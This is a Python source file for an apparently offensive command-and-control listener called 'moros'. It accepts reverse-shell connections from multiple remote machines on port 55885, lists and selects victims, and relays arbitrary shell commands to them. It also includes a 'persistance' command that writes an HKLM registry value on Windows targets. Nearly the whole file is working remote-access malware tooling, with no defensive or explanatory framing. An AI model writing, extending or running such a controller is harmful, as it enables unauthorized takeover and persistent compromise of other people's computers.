from queue import Queue
import tutilities.basic as basic
import threading
import socket 
import time
import os

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2] 
queue = Queue()

all_connections = [] # for computers connection view
all_addresses = [] # for human connection view

def socket_create():
    try:
        global s
        s = socket.socket() # the actual connection/conversation between the computers
    except socket.error as msg:
        print("[ERR0R] Socket Failed Connection (already bound?): " + str(msg))
        
# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global s
        s.bind(('', 55885))
        s.listen(5) # listen (waiting for client to connect) 5 (number of bad connections it will take before refusing any new connections [trys?])
        print("Please wait for prompt to appear, type 'list' or 'select' to get started.") 
        time.sleep(3)
        
    except socket.error as msg:
        print("[ERR0R] Socket binding erorr: " + str(msg) + "\n")
        time.sleep(5)
        socket_bind() # Retries
        
# Accept connections from multiple clients and save to list
def socket_saveClient():
    
    for c in all_connections:    #########################
        c.close()                # Closes all connections
    del all_connections[:]       # Clears lists 
    del all_addresses[:]         #########################
    
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1) # I don't want any timeout, disconnects when interrupted
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection Established | Client: "+str(address[0])+" | Port: "+str(address[1]))
        except socket.error as msg:
            print("Connection establishing failed: "+str(msg))  

# Essentially the main menu  
def console_start():
    basic.messageHelp()
    basic.messageBack()
    while True: 
        cmd = basic.consoleTitle("m0ros")
        if cmd == 'list': 
            command_TargetList()
        elif 'select' in cmd:
            conn = command_TargetSelect(cmd)
            if conn is not None:
                console(conn)
        elif cmd == 'help':
            command_help()
        #here
        elif cmd == 'clear':
            basic.clear()
        elif cmd == 'exit':
            basic.messageWarn("Returning back to Typhon.py, exiting moros and closing connections!")
            # TODO make it so connections can stay running in the background 
            basic.exit()
        else: 
            basic.messageInvalidError(cmd)
    
def command_TargetList():
    results = ''
    total = 0
    
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except socket.error as msg:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += '[ID: ' + str(i) + '] IP: ' + str(all_addresses[i][0]) + ' | Port: ' + str(all_addresses[i][1]) + '\n'
        total=total+1
        
    print('-=+ Connected Machines ['+ str(total) +'] +=-' + '\n' + results)

def command_TargetSelect(cmd):
    try:
        target = int(cmd.split(" ")[1])
        conn = all_connections[target]
        print("Now conntected to client: "+ str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("Connection failed or invalid connection, please select another host.")
        return None
                
def command_help():
    basic.messageInfo('clears the console output for you','\nclear')
    basic.messageInfo('shows this prompt','help')
    basic.messageInfo('exit the program, close connections {alias: (q)uit, stop}', 'exit')
    # TODO Add the alias'
    basic.messageInfo('list connected machines', 'list')
    basic.messageInfo('select a device to connect to, send commands with their id #\n','select [id#]')

# Interactive prompt: While connected to the machine, issues cmd commands
def console(conn):
    while True:
        try:
            cmd = input()
                
            if len(str.encode(cmd)) > 0:
                if (cmd.lower().__eq__("cd")):
                    print("supply a value to cd or it fucks up. -your welcome")
                    cmd = " "
                if (cmd.lower().__eq__("ls")):
                    if os.name == "nt":
                        cmd = "dir"
                if (cmd.lower().__eq__("persistance")):
                    if os.name == "nt":
                        # TODO [REQUIRES ADMIN, TO BE DONE IN INITIAL FOLDER][v=valuename(registrykey) t=type d=data f=removes need for confirmation]
                        cmd = f'REG ADD HKLM\SOFTWARE\Grayscale /v _G_PATH /t REG_SZ /d %cd% /f'
                        # TODO Another chance to add persistance without admin 
                        # cmd = f'SetX _G_PATH %cd% /m'
                        # Adding path to registry adds a path that will always be avaliable. 
                conn.send(str.encode(cmd)) # actually sending the custom command we made
                send_response = str(conn.recv(20480), "utf-8") # covert recieved bytes into basic string
                print(send_response, end="")
                
            if cmd == 'exit':
                basic.messageWarn("Exiting current client prompt, please wait...")
                time.sleep(1)
                break
        except:
            basic.messageWarn("Connection to client machine has been lost.")
            time.sleep(3)
            break

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work) 
        t.daemon = True # dies when main program exits 
        t.start()
    
# complete next job in queue    
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            socket_saveClient()
        elif x == 2:
            console_start()
        queue.task_done()

# each item in list is a job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()